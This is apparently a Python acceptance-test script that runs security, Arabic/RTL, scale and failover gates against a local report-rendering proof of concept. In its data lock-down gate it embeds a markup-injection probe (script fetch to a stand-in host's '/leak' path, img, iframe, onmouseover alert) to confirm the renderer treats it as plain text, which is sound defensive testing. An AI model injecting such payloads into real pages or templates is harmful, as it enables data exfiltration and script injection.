"""Runs gates G1, G3, G4 and G5 of RT-108 against the local PoC stack and writes the evidence.

    docker compose up --build -d          (from the repository root)
    python poc/gates/seed_templates.py
    python poc/gates/run_gates.py [g1 g3 g4 g5]

Talks to nginx on RT_WEB_PORT exactly like the SPA. PDF checks use poppler in the small
evidence-tools image (poc/tools). Results go to poc/evidence/gates-summary.json; the PDFs, XLSX
files and page images next to it are attached to RT-108 in Paca, not committed.
"""
import json
import pathlib
import re
import subprocess
import sys
import time
import uuid
import zipfile

import rtpoc

EVIDENCE = rtpoc.EVIDENCE
REPO = pathlib.Path(__file__).resolve().parents[2]
TOOLS_IMAGE = "rt108-evidence-tools"
PROJECT = __import__("os").environ.get("COMPOSE_PROJECT_NAME", "reporting-tool")

FULL_IBAN = re.compile(r"JO\d{2}CBJO\d{22}")
MASKED_IBAN = re.compile(r"JO\d{2}•{10,}")  # the PDF column may cut the tail with an ellipsis
NATIONAL_ID = re.compile(r"(?<!\d)9\d{9}(?!\d)")

summary = {}


def log(*parts):
    print(*parts, flush=True)


# ----- helpers -----

def tools(command):
    """Runs a shell command in the evidence-tools image with the evidence folder at /e."""
    if subprocess.run(["docker", "image", "inspect", TOOLS_IMAGE], capture_output=True).returncode != 0:
        subprocess.run(["docker", "build", "-q", "-t", TOOLS_IMAGE, str(REPO / "poc" / "tools")], check=True, capture_output=True)
    result = subprocess.run(["docker", "run", "--rm", "-v", f"{EVIDENCE}:/e", "-w", "/e", TOOLS_IMAGE, "sh", "-c", command],
                            capture_output=True, text=True, encoding="utf-8")
    return result.stdout + result.stderr


def pdf_info(name):
    info = {}
    for line in tools(f"pdfinfo {name}").splitlines():
        if ":" in line:
            key, value = line.split(":", 1)
            info[key.strip()] = value.strip()
    return info


def pdf_fonts(name):
    rows = tools(f"pdffonts {name}").splitlines()[2:]
    return [{"name": r.split()[0], "embedded": " yes " in f" {r} "} for r in rows if r.strip()]


def pdf_text(name, first=None, last=None):
    pages = (f"-f {first} " if first else "") + (f"-l {last} " if last else "")
    return tools(f"pdftotext -layout {pages}{name} -")


def xlsx_text(path):
    with zipfile.ZipFile(path) as z:
        return "\n".join(z.read(n).decode("utf-8") for n in z.namelist() if n.startswith("xl/") and n.endswith(".xml"))


def rasterize(name, prefix, pages, dpi=70):
    for page in pages:
        tools(f"pdftoppm -r {dpi} -png -f {page} -l {page} {name} {prefix}")


def metrics(run):
    m = json.loads(run["metricsJson"]) if run.get("metricsJson") else {}
    samples = m.pop("Samples", None) or m.pop("samples", None) or []
    return m, samples


def render(tok, template_key, parameters, formats, file_stem, timeout=3600):
    ids = json.loads((EVIDENCE / "template-ids.json").read_text(encoding="utf-8"))
    started = time.time()
    run = rtpoc.run(tok, ids[template_key], parameters, formats, timeout=timeout)
    wall = round(time.time() - started, 1)
    m, samples = metrics(run)
    files = {}
    if run["status"] == "Succeeded":
        for fmt in formats:
            target = EVIDENCE / f"{file_stem}.{fmt}"
            rtpoc.download(tok, run["id"], fmt, target)
            files[fmt] = target.name
    log(f"  {file_stem}: {run['status']} pages={run['pages']} rows={run['rows']} wall={wall}s on {run['renderedBy']} {run['error'] or ''}")
    return {"run": run, "metrics": m, "samples": samples, "wallSeconds": wall, "files": files}


def definition_with(template_key, change):
    definition = rtpoc.load_template(template_key)
    change(definition)
    return definition


def check(results, name, passed, detail=""):
    results.append({"check": name, "pass": bool(passed), "detail": detail})
    log(f"  [{'PASS' if passed else 'FAIL'}] {name} {detail}")


# ----- G1: Arabic / RTL -----

def gate_g1():
    log("G1 Arabic/RTL")
    tok = rtpoc.token("author.ar")
    out, checks = {}, []
    out["statement"] = render(tok, "statement-ar", {"ToClient": "CL-00003"}, ["pdf", "xlsx"], "g1-statement-ar")
    out["groupedAr"] = render(tok, "grouped-summary-ar", {"ToClient": "CL-00012"}, ["pdf", "xlsx"], "g1-grouped-summary-ar")
    out["groupedEn"] = render(tok, "grouped-summary-en", {"ToClient": "CL-00012"}, ["pdf", "xlsx"], "g1-grouped-summary-en")

    for key, stem in (("statement", "g1-statement-ar"), ("groupedAr", "g1-grouped-summary-ar"), ("groupedEn", "g1-grouped-summary-en")):
        info = pdf_info(f"{stem}.pdf")
        fonts = pdf_fonts(f"{stem}.pdf")
        out[key]["pdfInfo"] = {k: info.get(k) for k in ("Producer", "Tagged", "Pages", "Page size")}
        out[key]["fonts"] = sorted({f["name"].split("+")[-1] for f in fonts})
        check(checks, f"{stem}: tagged PDF", info.get("Tagged") == "yes", info.get("Tagged", ""))
        check(checks, f"{stem}: every font embedded", fonts and all(f["embedded"] for f in fonts), ", ".join(out[key]["fonts"]))

    text = pdf_text("g1-statement-ar.pdf", 1, 2)
    (EVIDENCE / "g1-statement-ar-page1-2.txt").write_text(text, encoding="utf-8")
    check(checks, "statement: Arabic text is extractable (real text, not images)", re.search(r"[؀-ۿ]{3,}", text) is not None)
    check(checks, "statement: amounts keep their sign and digit order", re.search(r"-\d{1,3}(,\d{3})*\.\d{2}", text) is not None)

    sheets = xlsx_text(EVIDENCE / "g1-statement-ar.xlsx")
    check(checks, "statement XLSX: sheet is right-to-left", 'rightToLeft="1"' in sheets)
    check(checks, "statement XLSX: Arabic headers present", re.search(r"[؀-ۿ]{3,}", sheets) is not None)

    rasterize("g1-statement-ar.pdf", "g1-statement-ar", [1, 2, 3])
    rasterize("g1-grouped-summary-ar.pdf", "g1-grouped-summary-ar", [1, 2])
    rasterize("g1-grouped-summary-en.pdf", "g1-grouped-summary-en", [1])
    tools("pdftoppm -r 160 -png -f 1 -l 1 -x 0 -y 0 -W 1323 -H 700 g1-statement-ar.pdf g1-statement-ar-zoom")
    out["checks"] = checks
    summary["G1"] = out


# ----- G3: data only through the Query service -----

def gate_g3():
    log("G3 data lock-down")
    checks, out = [], {}
    ar, en, none = rtpoc.token("author.ar"), rtpoc.token("author.en"), rtpoc.token("author.none")
    ids = json.loads((EVIDENCE / "template-ids.json").read_text(encoding="utf-8"))

    status, _, _ = rtpoc.call("GET", "/api/reports/catalog/datasets")
    check(checks, "no token: catalog refused", status == 401, f"HTTP {status}")

    _, _, catalog = rtpoc.call("GET", "/api/reports/catalog/datasets", ar)
    out["catalogAuthorAr"] = catalog
    dataset_ids = [d["id"] for d in catalog]
    fields = {f["key"]: f for d in catalog for f in d["fields"]}
    check(checks, "author.ar sees only the granted dataset", dataset_ids == ["client-transactions"], str(dataset_ids))
    check(checks, "hidden field NationalId is absent from the catalog", "NationalId" not in fields)
    check(checks, "masked field Iban is flagged as masked", fields.get("Iban", {}).get("masked") is True)
    check(checks, "catalog exposes no source table or column names",
          all(k not in json.dumps(catalog) for k in ("src.", "SourceTable", "SourceColumn")))

    _, _, catalog_none = rtpoc.call("GET", "/api/reports/catalog/datasets", none)
    check(checks, "author.none (no grants) sees no datasets", catalog_none == [], str(catalog_none))

    def try_save(tok, label, definition, expect):
        status, _, body = rtpoc.save_template(tok, f"g3-{label}", definition, template_id=str(uuid.uuid4()))
        errors = json.dumps(body, ensure_ascii=False)
        check(checks, f"save rejected: {label}", status == 400 and expect in errors, f"HTTP {status} {expect!r} in errors: {expect in errors}")

    def add_column(field):
        def change(d):
            d["layout"]["body"][0]["columns"].append({"field": field, "header": field, "widthPct": 10, "format": "text"})
        return change

    try_save(ar, "hidden field in a table", definition_with("listing-en", add_column("NationalId")), "Field not available: NationalId")
    try_save(ar, "dataset without a grant", definition_with("listing-en", lambda d: d["bindings"][0].update(datasetId="hr-salaries")),
             "Dataset not available: hr-salaries")
    try_save(ar, "filter on a masked field",
             definition_with("listing-en", lambda d: d["bindings"][0]["filters"].append({"field": "Iban", "op": "eq", "parameter": "ToClient"})),
             "Field not available for filtering")
    try_save(ar, "sort on a masked field", definition_with("listing-en", lambda d: d["bindings"][0].update(sort=["Iban"])),
             "Field not available for filtering")
    try_save(ar, "source column name instead of a catalog key", definition_with("listing-en", add_column("src.EmployeeSalaries.MonthlySalary")),
             "Field not available")
    try_save(none, "author without grants", rtpoc.load_template("listing-en"), "Dataset not available: client-transactions")

    status, _, _ = rtpoc.call("GET", f"/api/reports/templates/{ids['listing-en']}", en)
    check(checks, "another author cannot read the template", status == 404, f"HTTP {status}")
    status, _, _ = rtpoc.call("POST", "/api/reports/runs", en, {"templateId": ids["listing-en"], "parameters": {"ToClient": "CL-00005"}, "formats": ["pdf"]})
    check(checks, "another author cannot run the template", status == 404, f"HTTP {status}")

    listing = render(ar, "listing-en", {"ToClient": "CL-00005"}, ["pdf", "xlsx"], "g3-listing-masked")
    out["listing"] = listing
    pdf = pdf_text("g3-listing-masked.pdf")
    sheets = xlsx_text(EVIDENCE / "g3-listing-masked.xlsx")
    for where, text in (("PDF", pdf), ("XLSX", sheets)):
        check(checks, f"{where}: no clear IBAN", FULL_IBAN.search(text) is None)
        check(checks, f"{where}: IBAN appears masked", MASKED_IBAN.search(text) is not None)
        check(checks, f"{where}: no national ID", NATIONAL_ID.search(text) is None)
    rasterize("g3-listing-masked.pdf", "g3-listing-masked", [1])

    run_id = listing["run"]["id"]
    status, _, _ = rtpoc.call("GET", f"/api/reports/runs/{run_id}", en)
    check(checks, "another author cannot see the run", status == 404, f"HTTP {status}")
    status, _, _ = rtpoc.call("GET", f"/api/reports/runs/{run_id}/pdf", en, raw=True)
    check(checks, "another author cannot download the output", status == 404, f"HTTP {status}")

    # Author-supplied markup must stay text: nothing becomes a tag, so the browser has nothing to fetch.
    probe = "<img src=\"http://203.0.113.10/x.png\"><script>fetch('http://203.0.113.10/leak')</script><link rel=stylesheet href=\"http://203.0.113.10/a.css\">"

    def inject(d):
        d["layout"]["body"].insert(0, {"type": "text", "id": "probe", "text": probe, "style": {"fontSizePt": 9, "bold": False, "align": "start"}})
        d["layout"]["pageHeader"]["items"].append({"id": "probe-h", "kind": "text", "xMm": 0, "yMm": 0, "widthMm": 120, "heightMm": 5,
                                                    "text": "<iframe src=\"http://203.0.113.10/\"></iframe>{Report Name}",
                                                    "style": {"fontSizePt": 7, "bold": False, "align": "start"}})
        d["layout"]["body"][1]["columns"][0]["header"] = "<b onmouseover=alert(1)>Client</b>"

    status, _, saved = rtpoc.save_template(ar, "g3-markup-probe", definition_with("listing-en", inject), template_id=str(uuid.uuid5(uuid.NAMESPACE_URL, "rt108/g3-probe")))
    check(checks, "template with markup in text is accepted as data", status == 200, f"HTTP {status}")
    if status == 200:
        ids["g3-markup-probe"] = saved["id"]
        (EVIDENCE / "template-ids.json").write_text(json.dumps(ids, indent=1), encoding="utf-8")
        probe_run = render(ar, "g3-markup-probe", {"ToClient": "CL-00001"}, ["pdf"], "g3-markup-probe")
        out["markupProbe"] = probe_run
        blocked = probe_run["metrics"].get("BlockedRequests")
        check(checks, "markup probe: the browser attempted no request", blocked == 0, f"BlockedRequests={blocked}")
        text = pdf_text("g3-markup-probe.pdf", 1, 1)
        check(checks, "markup probe: markup is printed as literal text", "<script>fetch(" in text and "<img src=" in text)
        rasterize("g3-markup-probe.pdf", "g3-markup-probe", [1])

    out["checks"] = checks
    summary["G3"] = out


# ----- G4: headless rendering at size -----

def memory_profile(samples):
    if not samples:
        return {}
    rss = [s.get("ContainerRssMb", 0) for s in samples]
    quarter = max(1, len(rss) // 4)
    return {
        "samples": len(rss),
        "peakContainerRssMb": max(rss),
        "firstQuarterPeakMb": max(rss[:quarter]),
        "lastQuarterPeakMb": max(rss[-quarter:]),
        "endMb": rss[-1],
    }


def gate_g4():
    log("G4 rendering at size")
    tok = rtpoc.token("author.ar")
    checks, out = [], {}

    grouped = render(tok, "grouped-summary-ar", {"ToClient": "CL-00044"}, ["pdf", "xlsx"], "g4-grouped-50")
    out["grouped50"] = {k: v for k, v in grouped.items() if k != "samples"} | {"memory": memory_profile(grouped["samples"])}
    seconds = grouped["metrics"].get("TotalSeconds", 9e9)
    check(checks, "about 50-page grouped report well under 2 minutes", grouped["run"]["status"] == "Succeeded" and seconds < 60,
          f"{grouped['run']['pages']} pages in {seconds}s (job) / {grouped['wallSeconds']}s (wall)")

    big = render(tok, "statement-ar", {"ToClient": "CL-00995"}, ["pdf"], "g4-statements-2000")
    profile = memory_profile(big["samples"])
    out["statements2000"] = {k: v for k, v in big.items() if k != "samples"} | {"memory": profile}
    (EVIDENCE / "g4-statements-2000-memory.json").write_text(json.dumps(big["samples"]), encoding="utf-8")
    check(checks, "~2,000-page PDF succeeds", big["run"]["status"] == "Succeeded" and big["run"]["pages"] >= 1900,
          f"{big['run']['pages']} pages in {big['metrics'].get('TotalSeconds')}s, {big['metrics'].get('Chunks')} chunks")
    check(checks, "memory stays inside the 2 GB container limit", profile.get("peakContainerRssMb", 9e9) < 2048,
          f"peak {profile.get('peakContainerRssMb')} MB")
    check(checks, "memory is flat (last quarter peak within 25% of first quarter)",
          profile and profile["lastQuarterPeakMb"] <= profile["firstQuarterPeakMb"] * 1.25,
          f"first {profile.get('firstQuarterPeakMb')} MB, last {profile.get('lastQuarterPeakMb')} MB")
    if big["run"]["status"] == "Succeeded":
        info = pdf_info("g4-statements-2000.pdf")
        out["statements2000"]["pdfInfo"] = {k: info.get(k) for k in ("Pages", "Tagged", "File size")}
        rasterize("g4-statements-2000.pdf", "g4-statements-2000", [1, 1990])

    capped = render(tok, "statement-ar", {"ToClient": "CL-01100"}, ["pdf"], "g4-cap")
    out["pageCap"] = {"status": capped["run"]["status"], "error": capped["run"]["error"], "pagesWhenStopped": capped["run"]["pages"],
                      "seconds": capped["metrics"].get("TotalSeconds")}
    check(checks, "a run over the 2,000-page cap stops with 'Limit exceeded'",
          capped["run"]["status"] == "Failed" and "Limit exceeded" in (capped["run"]["error"] or ""), capped["run"]["error"] or "")
    out["checks"] = checks
    summary["G4"] = out


# ----- G5: two replicas -----

def compose(*args):
    return subprocess.run(["docker", "compose", *args], cwd=REPO, capture_output=True, text=True, encoding="utf-8")


def served_by(headers):
    return headers.get("X-Served-By") or headers.get("x-served-by")


def gate_g5():
    log("G5 two replicas")
    checks, out = [], {}
    compose("restart", "web")  # nginx resolves "reports" once; see the ADR finding about Compose DNS
    time.sleep(5)
    tok = rtpoc.token("author.ar")
    ids = json.loads((EVIDENCE / "template-ids.json").read_text(encoding="utf-8"))

    spread = {}
    for _ in range(40):
        status, headers, _ = rtpoc.call("GET", "/api/reports/catalog/datasets", tok)
        spread.setdefault(served_by(headers), []).append(status)
    out["spread"] = {k: len(v) for k, v in spread.items()}
    check(checks, "requests spread over both replicas", len(spread) == 2 and all(s == 200 for v in spread.values() for s in v), str(out["spread"]))

    steps = []
    status, headers, template = rtpoc.call("GET", f"/api/reports/templates/{ids['listing-en']}", tok)
    steps.append(("open template", status, served_by(headers), template["version"]))
    status, headers, saved = rtpoc.save_template(tok, template["name"], template["definition"], template_id=template["id"])
    steps.append(("save edit", status, served_by(headers), saved["version"]))
    status, headers, reread = rtpoc.call("GET", f"/api/reports/templates/{ids['listing-en']}", tok)
    steps.append(("reopen", status, served_by(headers), reread["version"]))
    status, headers, started = rtpoc.call("POST", "/api/reports/runs", tok, {"templateId": ids["listing-en"], "parameters": {"ToClient": "CL-00010"}, "formats": ["pdf"]})
    steps.append(("start run", status, served_by(headers), started["id"]))
    polled = set()
    while True:
        status, headers, current = rtpoc.call("GET", f"/api/reports/runs/{started['id']}", tok)
        polled.add(served_by(headers))
        if current["status"] in ("Succeeded", "Failed"):
            break
        time.sleep(0.5)
    steps.append(("poll run", status, ",".join(sorted(polled)), current["status"]))
    hosts = set()
    for _ in range(4):
        status, headers, _ = rtpoc.call("GET", f"/api/reports/runs/{started['id']}/pdf", tok, raw=True)
        hosts.add((served_by(headers), status))
    steps.append(("download output", ",".join(f"{h}:{s}" for h, s in sorted(hosts)), current["renderedBy"], ""))
    out["session"] = [dict(zip(("step", "status", "servedBy", "value"), s)) for s in steps]
    for s in steps:
        log("   ", s)
    check(checks, "edit saved on one replica is seen on the other", reread["version"] == saved["version"] == template["version"] + 1)
    check(checks, "run rendered by a worker and downloadable from every replica",
          current["status"] == "Succeeded" and all(code == 200 for _, code in hosts) and len({h for h, _ in hosts}) == 2, str(sorted(hosts)))

    victim = f"{PROJECT}-reports-1"
    subprocess.run(["docker", "stop", victim], capture_output=True)
    after = []
    for _ in range(20):
        status, headers, _ = rtpoc.call("GET", "/api/reports/catalog/datasets", tok)
        after.append((status, served_by(headers)))
    status_save, _, _ = rtpoc.save_template(tok, template["name"], template["definition"], template_id=template["id"])
    status_run, _, run = rtpoc.call("POST", "/api/reports/runs", tok, {"templateId": ids["listing-en"], "parameters": {"ToClient": "CL-00003"}, "formats": ["pdf"]})
    finished = rtpoc.run(tok, ids["listing-en"], {"ToClient": "CL-00002"}, ["pdf"], timeout=300) if status_run == 202 else None
    subprocess.run(["docker", "start", victim], capture_output=True)
    out["failover"] = {"stopped": victim, "gets": [s for s, _ in after], "servedBy": sorted({h for _, h in after if h}),
                       "saveStatus": status_save, "runStatus": status_run, "runAfterFailover": finished and finished["status"]}
    log("   failover", out["failover"])
    check(checks, "one replica stopped: the session carries on (no lost sessions)",
          all(s == 200 for s, _ in after) and status_save == 200 and status_run == 202 and finished and finished["status"] == "Succeeded",
          f"GETs {sorted(set(s for s, _ in after))}, save {status_save}, run {status_run}")
    out["checks"] = checks
    summary["G5"] = out


GATES = {"g1": gate_g1, "g3": gate_g3, "g4": gate_g4, "g5": gate_g5}

if __name__ == "__main__":
    selected = [a.lower() for a in sys.argv[1:]] or list(GATES)
    target = EVIDENCE / "gates-summary.json"
    if target.exists():
        summary.update(json.loads(target.read_text(encoding="utf-8")))
    for gate in selected:
        GATES[gate]()
        target.write_text(json.dumps(summary, indent=1, ensure_ascii=False, default=str), encoding="utf-8")
    failed = [c for g in summary.values() for c in g.get("checks", []) if not c["pass"]]
    log(f"\n{sum(len(g.get('checks', [])) for g in summary.values())} checks, {len(failed)} failed")
    for c in failed:
        log("  FAILED:", c["check"], c["detail"])
